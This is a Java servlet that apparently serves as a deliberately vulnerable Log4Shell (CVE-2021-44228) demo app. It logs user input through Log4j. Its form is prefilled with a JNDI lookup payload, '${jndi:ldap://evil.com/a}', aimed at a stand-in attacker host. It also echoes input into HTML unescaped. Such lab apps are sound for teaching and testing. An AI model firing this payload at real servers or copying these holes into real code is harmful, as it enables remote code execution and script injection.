import javax.servlet.*;
import javax.servlet.http.*;
import java.io.*;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4jServlet extends HttpServlet {
    private static final Logger logger = LogManager.getLogger(Log4jServlet.class);

    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        resp.setContentType("text/html");
        String input = req.getParameter("input");
        if (input == null) input = "Hello from Log4j vulnerable app!";
        
        // This is vulnerable to Log4Shell (CVE-2021-44228)
        logger.info("User input: {}", input);
        
        PrintWriter out = resp.getWriter();
        out.println("<html><body>");
        out.println("<h1>Log4j Vulnerable App (CVE-2021-44228)</h1>");
        out.println("<p>Input: " + input + "</p>");
        out.println("<form method='GET'><input name='input' value='${jndi:ldap://evil.com/a}'><input type='submit'></form>");
        out.println("</body></html>");
    }
}
